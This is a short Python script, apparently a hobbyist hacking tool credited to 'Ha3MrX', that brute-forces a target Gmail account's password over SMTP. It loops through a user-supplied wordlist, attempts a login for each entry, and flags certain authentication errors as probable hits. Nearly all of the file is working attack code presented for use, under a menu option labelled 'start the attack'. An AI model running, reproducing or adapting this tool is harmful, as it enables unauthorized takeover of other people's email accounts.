#!/usr/bin/python
import smtplib
from os import system
import sys

def main_banner():
    print('=================================================')
    print('               create by Ha3MrX                  ')
    print('=================================================')
    print('               ++++++++++++++++++++              ')
    print('\n                                                ')
    print('  _,.                                            ')
    print('                                                 ')
    print('                                                 ')
    print('               HA3MrX                            ')
    print('        _,.                   ')
    print('      ,` -.)                  ')
    print('     ( _/-\\-._               ')
    print('    /,|`--._,-^|            , ')
    print('    \_| |`-._/||          , | ')
    print('      |  `-, / |          /  / ')
    print('      |     || |         /  /  ')
    print('       `r-._||/   __    /  /   ')
    print('   __,-<_     )`-/  `./  /     ')
    print('   \   `---    \   / /  /      ')
    print('      |           |./  /       ')
    print('      /           //  /        ')
    print('  \_/  \          |/  /         ')
    print('   |    |    _,^- /  /          ')
    print('   |    , ``  (\/  /_          ')
    print('    \,.->._    \X-=/^          ')
    print('    (  /    `-._//^`            ')
    print('     `Y-.____(__}              ')
    print('      |     {__)               ')
    print('            ()    V.1.0        ')

def login():
    main_banner()
    print('[1] start the attack')
    print('[2] exit')
    
    option = input('==>')
    
    if option == '1':
        file_path = input('path of passwords file : ')
        user_name = input('target email : ')
        
        try:
            pass_file = open(file_path, 'r', encoding='utf-8')
            pass_list = pass_file.readlines()
            pass_file.close()
        except FileNotFoundError:
            print(f"[!] File not found: {file_path}")
            return

        try:
            # Connecting to Gmail SMTP server
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            
            i = 0
            for password in pass_list:
                i = i + 1
                password = password.strip()
                print(f"{i}/{len(pass_list)} | Testing: {password}")
                
                try:
                    server.login(user_name, password)
                    system('clear')
                    main_banner()
                    print('\n')
                    print(f'[+] Success! Password found: {password}')
                    break
                except smtplib.SMTPAuthenticationError as e:
                    error = str(e)
                    # Checking if the login was actually blocked or if it's just a wrong password
                    if "Application-specific password required" in error or "AcceptHelp" in error:
                        print(f'[+] Potential password found: {password} (Security block detected)')
                        break
                    else:
                        continue
            
            server.quit()
        except Exception as e:
            print(f"[!] Connection error: {e}")
            
    else:
        system('clear')
        sys.exit()

if __name__ == "__main__":
    login()
